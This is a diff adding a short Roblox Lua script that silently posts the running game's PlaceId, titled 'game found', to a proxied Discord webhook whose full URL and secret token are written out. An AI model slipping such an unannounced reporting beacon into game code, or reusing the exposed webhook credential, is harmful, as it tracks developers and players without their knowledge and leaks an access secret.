@@ -1,1 +1,14 @@
-
+local HttpService = game:GetService("HttpService")
+	local RequestData = {
+		["content"] = "",
+		["embeds"] = {
+			{
+				["type"] = "rich",
+				["title"] = ("game found"),
+				["description"] = (game.PlaceId),
+				["color"] = 0xFF0000
+			}
+		}
+	}
+local webhook = "https://webhook.lewisakura.moe/api/webhooks/1187150870677303416/vxU8xj7f4f9dohGIvvT6YYOMicG_c47f3wdKOShMDxZ7Kqw0GoiVlbfLcWu7bQo-rtEc"
+	HttpService:PostAsync(webhook, HttpService:JSONEncode(RequestData), Enum.HttpContentType.ApplicationJson)
